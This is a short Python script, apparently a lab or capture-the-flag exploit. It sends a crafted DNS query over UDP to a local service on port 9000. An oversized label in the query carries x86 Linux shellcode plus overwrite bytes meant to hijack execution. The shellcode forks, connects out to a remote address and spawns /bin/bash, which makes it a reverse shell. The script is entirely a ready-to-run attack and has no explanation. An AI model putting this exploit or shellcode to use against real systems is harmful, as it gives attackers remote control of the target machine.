import binascii
import socket


def send_udp_message(message, address, port):
    """send_udp_message sends a message to UDP server

    message should be a hexadecimal encoded string
    """
    message = message.replace(" ", "").replace("\n", "")
    server_address = (address, port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(binascii.unhexlify(message), server_address)
        data, _ = sock.recvfrom(4096)
    finally:
        sock.close()
    return binascii.hexlify(data).decode("utf-8")


def format_hex(hex):
    """format_hex returns a pretty version of a hex string"""
    octets = [hex[i:i+2] for i in range(0, len(hex), 2)]
    pairs = [" ".join(octets[i:i+2]) for i in range(0, len(octets), 2)]
    return "\n".join(pairs)


message = "AA AA 01 00 00 01 00 00 00 00 00 00 " \
"03 66 6f 6f 03 62 61 72 03 63 6f 6d 00" \
"00 01 00 01"

shellcode = '31 c0 31 d2 31 db 31 c9 b0 02 cd 80 83 f8 01 7c 02 eb 62 50 6a 01 6a 02 b0 66 b3 01 89 e1 cd 80 89 c3 31 c9 b0 3f cd 80 41 83 f9 04 75 f6 68 01 01 01 ff 66 68 1b 39 66 6a 02 89 e1 6a 10 51 53 89 e1 b0 66 cd 80 31 c9 29 c8 75 1b b0 02 cd 80 83 f8 01 7c 05 31 c0 50 eb 0d b0 0b eb 1f 5e 52 56 89 e1 89 f3 cd 80 31 c0 b0 06 cd 80 f3 90 0f 31 f3 90 eb 8b 31 c0 b0 01 31 db cd 80 e8 dc ff ff ff 2f 62 69 6e 2f 62 61 73 68'

shellcode_hex = binascii.unhexlify(shellcode.replace(" ", ""))
print(shellcode_hex)


message = "AA AA 01 00 00 01 00 00 00 00 00 00 " \
"ff" + shellcode+"61"*(0xff-len(shellcode_hex)) + \
"30" + "00 01 00 00 00 00 00 00" "00 01 00 00 00 00 00 00" "10 20 ff ff ff 7f 00 00" "00 01 00 00 00 01 00 00" "01 01 01 01 01 01 01 01" "19 0d 40 00 00 00 00 00" + "00"\
"00 01 00 01"

response = send_udp_message(message, "localhost", 9000)
print(format_hex(response))


